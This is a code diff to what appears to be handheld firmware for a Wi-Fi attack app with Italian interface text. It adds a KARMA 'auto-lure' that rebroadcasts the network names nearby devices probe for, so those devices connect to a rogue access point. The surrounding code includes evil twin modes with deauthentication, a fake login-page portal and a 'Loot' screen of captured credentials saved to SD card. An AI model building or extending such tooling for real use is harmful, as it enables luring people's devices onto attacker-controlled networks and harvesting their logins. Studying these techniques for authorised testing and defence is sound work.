@@ -68,6 +68,15 @@ int         nucleo_wifiatk_karma_heap(void);
 int         nucleo_wifiatk_karma_count(void);
 const char *nucleo_wifiatk_karma_ssid(int i);
 int         nucleo_wifiatk_karma_hits(int i);
+int         nucleo_wifiatk_karma_rssi(int i);
+// Beacon engine — KARMA Auto-lure feeds the captured wanted-SSIDs in and broadcasts them (mode 3 = CUSTOM).
+void          nucleo_wifiatk_beacon_custom_clear(void);
+bool          nucleo_wifiatk_beacon_custom_add(const char *ssid);
+int           nucleo_wifiatk_beacon_start(int mode);
+void          nucleo_wifiatk_beacon_stop(void);
+bool          nucleo_wifiatk_beacon_running(void);
+unsigned long nucleo_wifiatk_beacon_frames(void);
+int           nucleo_wifiatk_beacon_count(void);
 }
 
 #include "app_gfx.h"
@@ -79,7 +88,7 @@ static const unsigned short BG = 0x0841, FG = 0xFFFF, MUTED = 0x8C71, DIM = 0x44
 // ---- screens ----------------------------------------------------------------
 enum {
     ST_CONSENT, ST_HOME, ST_TARGETS, ST_KARMA, ST_SSID, ST_TYPE, ST_PAGE, ST_SETUP,
-    ST_RUNNING, ST_LOOT, ST_GUIDE, ST_SCAN, ST_KARMA_SCAN, ST_CLONE, ST_STOPPING,
+    ST_RUNNING, ST_LOOT, ST_GUIDE, ST_LURE, ST_SCAN, ST_KARMA_SCAN, ST_CLONE, ST_STOPPING,
 };
 // s_mode mirrors the engine's three flavours: 0 = Civetta (fake SSID), 1 = Gemello cattura (clone
 // OPEN + deauth), 2 = Gemello coerente (clone WPA2 security, no login). HOME picks Civetta/Gemello;
@@ -153,7 +162,8 @@ static void set_hint(void)
         case ST_CONSENT:   nucleo_app_set_hint("invio accetto   esc esci"); break;
         case ST_HOME:      nucleo_app_set_hint("su/giu  invio apri  tab menu  esc esci"); break;
         case ST_TARGETS:   nucleo_app_set_hint("su/giu  invio scegli  r riscan  esc indietro"); break;
-        case ST_KARMA:     nucleo_app_set_hint("su/giu  invio usa  r riascolta  esc indietro"); break;
+        case ST_KARMA:     nucleo_app_set_hint("invio civetta  b beacona tutte  r riascolta  esc"); break;
+        case ST_LURE:      nucleo_app_set_hint("invio: ferma esca   esc: indietro"); break;
         case ST_SSID:      nucleo_app_set_hint("su/giu  invio scegli  esc indietro"); break;
         case ST_TYPE:      nucleo_app_set_hint("scrivi  invio ok  canc  esc indietro"); break;
         case ST_PAGE:      nucleo_app_set_hint("su/giu  invio scegli  esc indietro"); break;
@@ -283,7 +293,7 @@ static void tick(void)
         nucleo_app_exit();
         return;
     }
-    if (s_state != ST_RUNNING) return;
+    if (s_state != ST_RUNNING && s_state != ST_LURE) return;
     uint32_t t = (uint32_t)(esp_timer_get_time() / 1000000);
     if (t != s_last_refresh) { s_last_refresh = t; s_pulse = !s_pulse; nucleo_app_request_draw(); }
 }
@@ -335,8 +345,10 @@ static void get_targets(int i, char *name, int nc, char *val, int vc, unsigned s
 }
 static void get_karma(int i, char *name, int nc, char *val, int vc, unsigned short *dot)
 {
-    snprintf(name, nc, "%.20s", nucleo_wifiatk_karma_ssid(i));
-    snprintf(val, vc, "x%d", nucleo_wifiatk_karma_hits(i)); *dot = YEL;
+    snprintf(name, nc, "%.18s", nucleo_wifiatk_karma_ssid(i));
+    snprintf(val, vc, "x%d %ddB", nucleo_wifiatk_karma_hits(i), nucleo_wifiatk_karma_rssi(i));
+    int r = nucleo_wifiatk_karma_rssi(i);
+    *dot = r > -60 ? GRN : (r > -75 ? YEL : EP_RED);   // green = a close device wants this network
 }
 static void get_ssid(int i, char *name, int nc, char *val, int vc, unsigned short *dot)
 {
@@ -497,6 +509,24 @@ static void draw_running(int h)
     else d.print("invio: ferma   tab: menu");
 }
 
+// KARMA Auto-lure: broadcasting the exact networks nearby devices were asking for.
+static void draw_lure(int h)
+{
+    app_ui_title("Esca KARMA", EP_RED, "LURE");
+    if (s_pulse) d.fillCircle(150, 9, 4, EP_RED);
+    d.setTextSize(1); d.setTextColor(EP_RED, BG); d.setCursor(160, 7); d.print("TX");
+    d.setTextSize(1); d.setTextColor(GRN, BG); d.setCursor(10, 30);
+    char ss[34]; snprintf(ss, sizeof ss, "%d reti cercate in onda", nucleo_wifiatk_beacon_count()); d.print(ss);
+    d.setTextSize(2); d.setTextColor(FG, BG); d.setCursor(10, 52);
+    char fr[20]; unsigned long f = nucleo_wifiatk_beacon_frames();
+    snprintf(fr, sizeof fr, "%lu beacon", f); d.print(fr);
+    d.drawFastHLine(10, 80, 220, LINE);
+    d.setTextSize(1); d.setTextColor(MUTED, BG); d.setCursor(10, 88);
+    d.print("i device vedono 'la loro' rete");
+    d.setTextColor(DIM, BG); d.setCursor(10, 99); d.print("e provano a collegarsi a noi");
+    d.setTextColor(YEL, BG); d.setCursor(10, h - 9); d.print("invio: ferma");
+}
+
 static void draw_guide(int h)
 {
     app_ui_title("Guida", EP_RED, "");
@@ -546,6 +576,7 @@ static void draw(void)
         case ST_PAGE:    ui_list("Pagina login", "", s_tpl_n, s_sel, get_page, "nessun template", nullptr); break;
         case ST_SETUP:   draw_setup(h); break;
         case ST_RUNNING: draw_running(h); break;
+        case ST_LURE:    draw_lure(h); break;
         case ST_LOOT:    ui_list("Loot", "", nucleo_evilportal_recent_count(), s_sel, get_loot, "ancora nulla", "salvato su /sd/evilportal/loot"); break;
         case ST_GUIDE:   draw_guide(h); break;
         case ST_SCAN:    draw_busy("Scansione...", "Cerco le reti reali vicine.", h); s_scan_armed = true; break;
@@ -587,6 +618,7 @@ static bool ep_back(int key)
         case ST_SSID: case ST_PAGE: go(ST_SETUP); return true;
         case ST_TYPE: go(ST_SSID); return true;
         case ST_SETUP: case ST_TARGETS: case ST_KARMA: go(ST_HOME); return true;
+        case ST_LURE: nucleo_wifiatk_beacon_stop(); go(ST_HOME); return true;
         case ST_LOOT: case ST_GUIDE: go(s_ret ? s_ret : ST_HOME); return true;
         default: return false;   // HOME / RUNNING / consent / busy -> let the framework close the app
     }
@@ -626,16 +658,22 @@ static void on_key(int key, char ch)
             else if (key == NK_ENTER && s_ap_n > 0) { twin_autopick_template(); build_rows(); go(ST_SETUP); }
             else if (ch == 'r' || ch == 'R') { s_scan_armed = false; go(ST_SCAN); }
             return;
-        case ST_KARMA:
-            if (key == NK_UP || key == NK_DOWN) { list_nav(&s_km_sel, nucleo_wifiatk_karma_count(), key); nucleo_app_request_draw(); }
-            else if (key == NK_ENTER && nucleo_wifiatk_karma_count() > 0) {
+        case ST_KARMA: {
+            int kn = nucleo_wifiatk_karma_count();
+            if (key == NK_UP || key == NK_DOWN) { list_nav(&s_km_sel, kn, key); nucleo_app_request_draw(); }
+            else if (key == NK_ENTER && kn > 0) {            // adopt ONE as the Civetta lure
                 snprintf(s_custom, sizeof s_custom, "%s", nucleo_wifiatk_karma_ssid(s_km_sel));
                 s_mode = 0; build_rows();
-                for (int i = 0; i < s_nrows; i++) if (s_rows[i] == R_SSID) s_sel = i;
                 snprintf(s_err, sizeof s_err, "Karma: %.20s", s_custom);
                 go(ST_SETUP);
+            } else if ((ch == 'b' || ch == 'B') && kn > 0) { // AUTO-LURE: beacon ALL the wanted SSIDs
+                nucleo_wifiatk_beacon_custom_clear();
+                for (int i = 0; i < kn; i++) nucleo_wifiatk_beacon_custom_add(nucleo_wifiatk_karma_ssid(i));
+                if (nucleo_wifiatk_beacon_start(3 /*CUSTOM*/) == 0) go(ST_LURE);
+                else { snprintf(s_err, sizeof s_err, "Beacon non avviato"); nucleo_app_request_draw(); }
             } else if (ch == 'r' || ch == 'R') { s_karma_armed = false; s_karma_started = false; go(ST_KARMA_SCAN); }
             return;
+        }
         case ST_SSID:
             if (key == NK_UP || key == NK_DOWN) { list_nav(&s_sel, s_ssid_n + 1, key); nucleo_app_request_draw(); }
             else if (key == NK_ENTER) {
@@ -671,6 +709,9 @@ static void on_key(int key, char ch)
             return;
         case ST_RUNNING:
             if (key == NK_ENTER) { s_stop_armed = false; go(ST_STOPPING); }
+            return;
+        case ST_LURE:
+            if (key == NK_ENTER) { nucleo_wifiatk_beacon_stop(); go(ST_KARMA); }
             return;
         case ST_LOOT:
             if (key == NK_UP || key == NK_DOWN) { list_nav(&s_sel, nucleo_evilportal_recent_count(), key); nucleo_app_request_draw(); }
